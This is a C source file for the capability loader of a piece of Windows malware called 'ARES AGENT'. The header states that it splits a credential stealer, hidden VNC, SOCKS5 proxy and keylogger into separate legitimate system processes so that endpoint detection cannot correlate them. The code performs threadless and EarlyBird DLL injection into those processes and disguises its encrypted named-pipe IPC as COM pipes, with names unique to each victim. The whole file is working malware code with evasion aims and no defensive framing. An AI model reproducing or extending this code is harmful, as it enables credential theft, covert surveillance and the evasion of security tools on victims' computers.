/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES AGENT — Modular Capability Loader (v3.5 Phase-2 A-grade)
 *
 *  Breaks monolithic agent into isolated capabilities:
 *    - Core agent: beacon + task dispatch only (~30KB footprint)
 *    - Each capability (stealer, hVNC, SOCKS5, keylog) runs as
 *      a reflective DLL injected into a SEPARATE host process
 *
 *  Why: EDR correlates behaviors within a SINGLE process. If the
 *  same PID does credential theft + screen capture + network proxy +
 *  shellcode injection, it's instant detection. By isolating each
 *  capability into different processes, EDR cannot correlate them.
 *
 *  Host process selection:
 *    - Stealer    → RuntimeBroker.exe (legitimate browser subsystem)
 *    - hVNC       → explorer.exe (legitimate screen access)
 *    - SOCKS5     → svchost.exe (legitimate network activity)
 *    - Keylogger  → ctfmon.exe (legitimate keyboard hook)
 *
 *  IPC: Encrypted named pipes between core and each capability.
 *  Pipe names derived from bot_id hash — unique per victim.
 * ═══════════════════════════════════════════════════════════════
 */

#include "ares_agent.h"
#if __has_include("ares_config.h")
#include "ares_config.h"
#endif
#include "ares_resolve.h"
#include <stdio.h>
#include <string.h>

/* ── Capability Registry ── */

static CAPABILITY_INFO g_capabilities[CAP_MAX] = {
    { CAP_STEALER, "RuntimeBroker.exe", FALSE, 0, NULL },
    { CAP_HVNC,    "explorer.exe",      FALSE, 0, NULL },
    { CAP_SOCKS5,  "svchost.exe",       FALSE, 0, NULL },
    { CAP_KEYLOG,  "ctfmon.exe",        FALSE, 0, NULL },
};

/* v3.8 UPG-06: Check if a capability is loaded and IPC-connected.
 * Called from main.c to verify sacrificial process is ready. */
BOOL g_capabilities_loaded(CAPABILITY_ID cap)
{
    if (cap >= CAP_MAX) return FALSE;
    return g_capabilities[cap].loaded && g_capabilities[cap].pipe != NULL;
}

/* ── IPC Pipe Management ── */

/* Generate unique pipe name from bot_id + capability ID.
 * Format: \\.\pipe\{hash} — looks like a standard COM pipe. */
static void _gen_pipe_name(CAPABILITY_ID cap, char* out, int maxlen)
{
    extern char g_bot_id_global[64];
    DWORD hash = 0x811C9DC5; /* FNV-1a offset basis */
    for (int i = 0; g_bot_id_global[i]; i++)
        hash = (hash ^ (BYTE)g_bot_id_global[i]) * 0x01000193;
    hash ^= (DWORD)cap * 0xDEAD;

    snprintf(out, maxlen,
        "\\\\.\\pipe\\{%08X-%04X-%04X-%04X-%012llX}",
        hash,
        (WORD)(hash >> 16), (WORD)(hash >> 8),
        (WORD)(hash ^ 0xBEEF),
        (unsigned long long)(hash * 0x100000001ULL));
}

/* Create a named pipe server for IPC with a capability module */
static HANDLE _create_ipc_pipe(CAPABILITY_ID cap)
{
    char pipeName[256];
    _gen_pipe_name(cap, pipeName, sizeof(pipeName));

    HANDLE hPipe = CreateNamedPipeA(
        pipeName,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1,          /* single instance */
        65536,      /* output buffer */
        65536,      /* input buffer */
        0,          /* default timeout */
        NULL);      /* default security */

    return hPipe;
}

/* ── XOR-encrypted IPC ── */

/* Simple XOR encryption for pipe data — key derived from bot_id */
static BYTE _ipc_key(CAPABILITY_ID cap)
{
    extern char g_bot_id_global[64];
    BYTE key = 0x5A ^ (BYTE)cap;
    for (int i = 0; g_bot_id_global[i]; i++)
        key = (key * 31) ^ (BYTE)g_bot_id_global[i];
    if (key == 0) key = 0x7F;
    return key;
}

static void _ipc_crypt(BYTE* data, SIZE_T len, BYTE key)
{
    for (SIZE_T i = 0; i < len; i++)
        data[i] ^= (key ^ (BYTE)(i & 0xFF));
}

/* ── Load Capability ──
 *  1. Find or verify the host process
 *  2. Create IPC pipe (core side)
 *  3. Inject the capability DLL into the host process
 *  4. Capability DLL connects back to our pipe on init
 *  5. Return TRUE when pipe is connected */

BOOL Ares_LoadCapability(AGENT_STATE* state, CAPABILITY_ID cap,
                          const BYTE* dll_data, SIZE_T dll_size)
{
    if (cap >= CAP_MAX) return FALSE;
    if (g_capabilities[cap].loaded) return TRUE; /* already loaded */

    /* Step 1: Create IPC pipe */
    HANDLE hPipe = _create_ipc_pipe(cap);
    if (hPipe == INVALID_HANDLE_VALUE) return FALSE;

    /* Step 2: Inject DLL into target process using threadless injection.
     * The DLL's DllMain will connect back to our pipe. */
    const char* host = g_capabilities[cap].host_process;

    /* Prefer threadless injection for GUI processes (explorer, RuntimeBroker).
     * Fallback to EarlyBird for non-GUI (svchost). */
    BOOL injected = Ares_Inject_Threadless(state, host, dll_data, dll_size);

    if (!injected) {
        /* Fallback: try EarlyBird with a new instance */
        wchar_t wHost[256];
        MultiByteToWideChar(CP_UTF8, 0, host, -1, wHost, 256);
        injected = Ares_Inject_EarlyBird(state, wHost, dll_data, dll_size);
    }

    if (!injected) {
        CloseHandle(hPipe);
        return FALSE;
    }

    /* Step 3: Wait for capability to connect (max 10 seconds) */
    BOOL connected = FALSE;
    for (int retry = 0; retry < 20 && !connected; retry++) {
        connected = ConnectNamedPipe(hPipe, NULL) ||
                    GetLastError() == ERROR_PIPE_CONNECTED;
        if (!connected) Sleep(500);
    }

    if (!connected) {
        CloseHandle(hPipe);
        return FALSE;
    }

    /* Step 4: Send initialization data (bot_id, C2 config) */
    {
        extern char g_bot_id_global[64];
        BYTE init_msg[128];
        int init_len = snprintf((char*)init_msg, sizeof(init_msg),
            "{\"cap\":%d,\"bot_id\":\"%s\"}", cap, g_bot_id_global);
        BYTE key = _ipc_key(cap);
        _ipc_crypt(init_msg, (SIZE_T)init_len, key);
        DWORD written;
        WriteFile(hPipe, init_msg, init_len, &written, NULL);
    }

    g_capabilities[cap].pipe = hPipe;
    g_capabilities[cap].loaded = TRUE;

    return TRUE;
}

/* ── Unload Capability ── */

BOOL Ares_UnloadCapability(CAPABILITY_ID cap)
{
    if (cap >= CAP_MAX) return FALSE;
    if (!g_capabilities[cap].loaded) return TRUE;

    /* Send shutdown command via pipe */
    if (g_capabilities[cap].pipe) {
        BYTE shutdown[] = "{\"cmd\":\"exit\"}";
        BYTE key = _ipc_key(cap);
        _ipc_crypt(shutdown, sizeof(shutdown) - 1, key);
        DWORD written;
        WriteFile(g_capabilities[cap].pipe, shutdown,
                  sizeof(shutdown) - 1, &written, NULL);

        /* Give capability time to clean up */
        Sleep(1000);

        DisconnectNamedPipe(g_capabilities[cap].pipe);
        CloseHandle(g_capabilities[cap].pipe);
    }

    g_capabilities[cap].pipe = NULL;
    g_capabilities[cap].loaded = FALSE;
    g_capabilities[cap].host_pid = 0;

    return TRUE;
}

/* ── Send data to capability ── */

BOOL Ares_SendToCapability(CAPABILITY_ID cap, const BYTE* data, SIZE_T len)
{
    if (cap >= CAP_MAX || !g_capabilities[cap].loaded || !g_capabilities[cap].pipe)
        return FALSE;

    /* Encrypt before sending */
    BYTE* enc = (BYTE*)HeapAlloc(GetProcessHeap(), 0, len);
    if (!enc) return FALSE;
    memcpy(enc, data, len);
    _ipc_crypt(enc, len, _ipc_key(cap));

    DWORD written;
    BOOL ok = WriteFile(g_capabilities[cap].pipe, enc, (DWORD)len, &written, NULL);
    HeapFree(GetProcessHeap(), 0, enc);
    return ok && written == len;
}

/* ── Receive data from capability ── */

BOOL Ares_RecvFromCapability(CAPABILITY_ID cap, BYTE* buf, SIZE_T buflen, SIZE_T* received)
{
    if (cap >= CAP_MAX || !g_capabilities[cap].loaded || !g_capabilities[cap].pipe)
        return FALSE;

    DWORD bytesAvail = 0;
    if (!PeekNamedPipe(g_capabilities[cap].pipe, NULL, 0, NULL, &bytesAvail, NULL))
        return FALSE;
    if (bytesAvail == 0) { *received = 0; return TRUE; } /* no data yet */

    DWORD toRead = (DWORD)((bytesAvail < buflen) ? bytesAvail : buflen);
    DWORD bytesRead;
    if (!ReadFile(g_capabilities[cap].pipe, buf, toRead, &bytesRead, NULL))
        return FALSE;

    /* Decrypt */
    _ipc_crypt(buf, bytesRead, _ipc_key(cap));
    *received = bytesRead;
    return TRUE;
}
